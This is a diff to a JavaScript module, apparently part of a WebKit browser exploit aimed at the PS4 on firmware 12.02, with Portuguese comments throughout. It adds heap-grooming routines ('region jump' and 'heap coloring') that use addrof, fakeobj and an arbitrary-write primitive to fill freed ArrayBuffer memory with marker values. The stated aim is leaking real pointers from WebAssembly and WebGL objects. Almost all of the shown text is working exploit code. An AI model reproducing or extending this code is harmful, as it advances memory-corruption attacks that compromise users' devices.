@@ -1,9 +1,10 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v117 - R77 com Fix de Escopo NEW_POLLUTION_VALUE)
+// js/script3/testArrayBufferVictimCrash.mjs (v119 - R79 com Salto de Região e Coloring)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
-// Corrigido o erro de escopo 'NEW_POLLUTION_VALUE is not defined' para que
-// a função decodePS4Pointer possa acessá-lo corretamente.
-// Mantém as estratégias de alocação diferenciada e restauração de heap.
+// Implementa a "Técnica de Salto de Região" e "Heap Coloring" simplificado
+// para contornar a reutilização agressiva de heap no PS4 12.02.
+// - Objetivo: Forçar alocações de objetos críticos em regiões de memória "limpas"
+//   ou com padrões controlados, para permitir o vazamento de ponteiros reais.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
@@ -15,7 +16,7 @@ import {
 } from '../core_exploit.mjs';
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs'; // Importar WEBKIT_LIBRARY_INFO
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v117_R77_PollutionScopeFix";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v119_R79_RegionJumpColor";
 
 // --- Funções de Conversão (Double <-> Int64) ---
 function int64ToDouble(int64) {
@@ -34,12 +35,16 @@ function doubleToInt64(double) {
     return new AdvancedInt64(u32[0], u32[1]);
 }
 
-// --- DEFINIÇÃO GLOBAL PARA O VALOR DE POLUIÇÃO ---
-// Deve ser definida fora da função principal para ser acessível a decodePS4Pointer
+// --- DEFINIÇÃO GLOBAL PARA O VALOR DE POLUIÇÃO E CORES ---
 const NEW_POLLUTION_VALUE_GLOBAL = new AdvancedInt64(0xCAFEBABE, 0xDEADBEEF); 
+const HEAP_COLORS = [
+    new AdvancedInt64(0xAAAAAAA0, 0xAAAAAAA0), // Cor 0
+    new AdvancedInt64(0xBBBBBBB1, 0xBBBBBBB1), // Cor 1
+    new AdvancedInt64(0xCCCCCC2, 0xCCCCCC2), // Cor 2
+    new AdvancedInt64(0xDDDDD3, 0xDDDDD3) // Cor 3
+];
 
 // --- Funções de Decodificação de Ponteiros (Ajustada para a Análise do PS4) ---
-// Constante NEW_POLLUTION_VALUE deve ser globalmente acessível para decodePS4Pointer.
 const PS4_HEAP_BASE = AdvancedInt64.fromParts(0x20000000, 0); 
 
 function decodePS4Pointer(encoded_adv_int64) {
@@ -55,11 +60,19 @@ function decodePS4Pointer(encoded_adv_int64) {
 
     logS3(`    [decodePS4Pointer] Original: ${encoded_adv_int64.toString(true)}, Tag: ${toHex(typeTag)}, High_part: ${toHex(address_high_part)}`, "debug");
 
-    if (encoded_adv_int64.equals(NEW_POLLUTION_VALUE_GLOBAL)) { // Agora acessível globalmente
+    if (encoded_adv_int64.equals(NEW_POLLUTION_VALUE_GLOBAL)) { 
         logS3(`    [decodePS4Pointer] Valor de poluição (${NEW_POLLUTION_VALUE_GLOBAL.toString(true)}) detectado. Retornando como está (não é um ponteiro para decodificar).`, "warn");
         return encoded_adv_int64; // Não é um ponteiro para decodificar, é o valor de poluição
     }
     
+    // Verificar se é uma das cores do Heap Coloring
+    for (const color of HEAP_COLORS) {
+        if (encoded_adv_int64.equals(color)) {
+            logS3(`    [decodePS4Pointer] Valor de coloração de heap (${color.toString(true)}) detectado. Retornando como está.`, "warn");
+            return encoded_adv_int64;
+        }
+    }
+
     // Reconstruímos o ponteiro sem a tag.
     return new AdvancedInt64(low_word, address_high_part);
 }
@@ -70,15 +83,13 @@ function decodePS4Pointer(encoded_adv_int64) {
 // =======================================================================================
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação Final com Verificação e Diagnóstico de Vazamento (Alocação Pioneira, WebGL, Alocação Diferenciada) ---`, "test");
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação Final com Verificação e Diagnóstico de Vazamento (Alocação Pioneira, WebGL, Alocação Diferenciada, Salto de Região) ---`, "test");
 
     let final_result = {
         success: false,
         message: "A verificação funcional de L/E falhou ou vazamento WebKit falhou.",
         webkit_leak_details: { success: false, msg: "Vazamento WebKit não tentado ou falhou." }
     };
-
-    // A variável NEW_POLLUTION_VALUE_GLOBAL já está definida no escopo do módulo.
 
     // --- DEFINIÇÃO DE ADDROF/FAKEOBJ AQUI (Escopo Global da Função) ---
     const confused_array = [13.37];
@@ -96,6 +107,46 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         return obj;
     };
     // -------------------------------------------------------------------
+
+    // --- Auxiliar para alocar em "região limpa" usando Salto de Região ---
+    async function allocateInCleanRegion(size_bytes, color_pattern = null) {
+        logS3(`  [allocateInCleanRegion] Tentando alocar objeto de ${toHex(size_bytes)} bytes em região "limpa"...`, "debug");
+        // 1. Alocar objeto sentinela do mesmo tamanho
+        let sentinel = new ArrayBuffer(size_bytes);
+        let sentinelAddr = addrof(sentinel);
+        logS3(`    [allocateInCleanRegion] Sentinela alocada em ${sentinelAddr.toString(true)}.`, "debug");
+
+        // 2. Opcional: Colorir a memória do sentinela
+        if (color_pattern && isAdvancedInt64Object(color_pattern)) {
+             try {
+                // Arb_write_final opera em 8 bytes. Preencher com o padrão.
+                for (let i = 0; i < size_bytes; i += 8) {
+                    await arb_write_final(sentinelAddr.add(i), color_pattern);
+                }
+                logS3(`    [allocateInCleanRegion] Sentinela colorida com ${color_pattern.toString(true)}.`, "debug");
+             } catch (color_err) {
+                 logS3(`    [allocateInCleanRegion] Erro ao colorir sentinela: ${color_err.message}`, "warn");
+             }
+        }
+        
+        // 3. Liberar sentinela para criar um "buraco"
+        sentinel = null;
+        // Tentar forçar o GC imediatamente, embora no PS4 ele seja conservador
+        await PAUSE_S3(50); // Pequena pausa para permitir agendamento do GC
+        logS3(`    [allocateInCleanRegion] Sentinela liberada.`, "debug");
+        
+        // 4. Forçar GC (chamada não padrão, mas útil em alguns ambientes)
+        // if (typeof gc === 'function') gc(); // Descomentar se gc() estiver disponível
+
+        await PAUSE_S3(100); // Pausa para permitir que o buraco seja "registrado"
+        logS3(`    [allocateInCleanRegion] Tentando alocar objeto real no "buraco"...`, "debug");
+
+        // Aloca o objeto real (neste caso, retorna null para indicar que a alocação é externa)
+        // A função que chama `allocateInCleanRegion` é responsável por alocar o WASM ou WebGL de fato.
+        // O objetivo aqui é apenas "preparar" um buraco.
+        return true; // Indica que o processo de salto foi iniciado.
+    }
+
 
     try {
         // --- FASE 1: Alocação Pioneira de WebAssembly (Antes da Poluição de L/E) ---
@@ -121,20 +172,9 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             aggressive_feng_shui_objects.length = 0;
             aggressive_feng_shui_objects = null;
 
-            // Técnica de Restauração de Heap para o tamanho WASM (antes de alocar WASM)
-            logS3(`  Tentando "limpar" a região de tamanho ${toHex(WASM_INSTANCE_SIZE_HINT)} para WASM...`, "debug");
-            let wasm_cleaner_pool = [];
-            for(let i = 0; i < 50; i++) { // Alocar alguns "limpadores"
-                const cleaner = new Uint8Array(WASM_INSTANCE_SIZE_HINT);
-                cleaner.fill(0xCC); // Padrão de limpeza
-                wasm_cleaner_pool.push(cleaner);
-            }
-            await PAUSE_S3(100); // Dar um tempo para o alocador processar
-            wasm_cleaner_pool.length = 0; // Liberar os limpadores
-            wasm_cleaner_pool = null;
-            logS3(`  Região de tamanho ${toHex(WASM_INSTANCE_SIZE_HINT)} supostamente limpa.`, "debug");
-
-
+            // Técnica de Restauração de Heap e Salto de Região para o tamanho WASM
+            await allocateInCleanRegion(WASM_INSTANCE_SIZE_HINT, HEAP_COLORS[0]); // Tenta limpar e colorir
+            
             await PAUSE_S3(5000); // Pausa ainda maior (5 segundos)
             logS3(`  Heap Feng Shui concluído. Pausa (5000ms) finalizada. Tentando compilar e instanciar WebAssembly (Pioneira)...`, "debug");
 
@@ -301,16 +341,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         // Alocação e limpeza específica para WebGL (tamanho diferente de WASM e L/E)
         const WEBGL_BUFFER_SIZE = 0x300; // Tamanho sugerido para WebGL
         logS3(`  Tentando "limpar" a região de tamanho ${toHex(WEBGL_BUFFER_SIZE)} para WebGL...`, "debug");
-        let webgl_cleaner_pool = [];
-        for(let i = 0; i < 50; i++) {
-            const cleaner = new Uint8Array(WEBGL_BUFFER_SIZE);
-            cleaner.fill(0xCC);
-            webgl_cleaner_pool.push(cleaner);
-        }
-        await PAUSE_S3(100);
-        webgl_cleaner_pool.length = 0;
-        webgl_cleaner_pool = null;
-        logS3(`  Região de tamanho ${toHex(WEBGL_BUFFER_SIZE)} supostamente limpa.`, "debug");
+        await allocateInCleanRegion(WEBGL_BUFFER_SIZE, HEAP_COLORS[1]); // Tenta limpar e colorir
         
         try {
             const gl = document.createElement('canvas').getContext('webgl');
@@ -321,7 +352,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
             
             // Forçar exposição de metadados
-            // A análise sugere gl.bufferData(gl.ARRAY_BUFFER, 1000, gl.STATIC_DRAW);
             gl.bufferData(gl.ARRAY_BUFFER, WEBGL_BUFFER_SIZE, gl.STATIC_DRAW); // Usar o tamanho diferenciado
             
             const gl_buffer_addr = addrof(buffer); // Obter o addrof do objeto JS do buffer WebGL
